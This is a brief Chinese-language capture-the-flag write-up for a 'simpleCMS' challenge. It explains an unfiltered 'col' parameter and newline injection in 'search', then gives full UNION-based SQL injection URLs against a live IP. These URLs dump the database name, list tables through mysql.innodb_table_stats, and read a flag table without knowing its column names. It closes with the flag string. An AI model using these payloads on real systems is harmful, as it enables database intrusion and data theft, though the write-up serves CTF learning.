# simpleCMS

col沒擋`#`和`:`

所以可以註解掉後面整句

接著search可以塞換行，繼續接SQL語句

閉合前面的LOWER(

後面就可以UNION based撈資料惹


## 爆庫名
http://13.125.3.183/index.php?act=board&mid=search&type=2&col=title|idx%23&search=%0A)%20union+select+1,database(),3,4,5%20limit%200,1--+

## 不用information_schema爆表名 (innodb)
http://13.125.3.183/index.php?act=board&mid=search&type=2&col=title|idx%23&search=%0A)%20union+select+1,table_name,3,4,5%20from%20mysql.innodb_table_stats%20limit%202,1--+

## 爆flag (不用column name)
http://13.125.3.183/index.php?act=board&mid=search&type=2&col=title|idx%23&search=%0A)%20union+select+c,2,3,4,5%20from%20(SELECT%201%20a,2%20b,3%20c,%204%20d%20UNION%20SELECT%20*%20FROM%2041786c497656426a6149_flag)x%20limit%201,1--+

## flag
`flag{you_are_error_based_sqli_master_XDDDD_XD_SD_xD}`
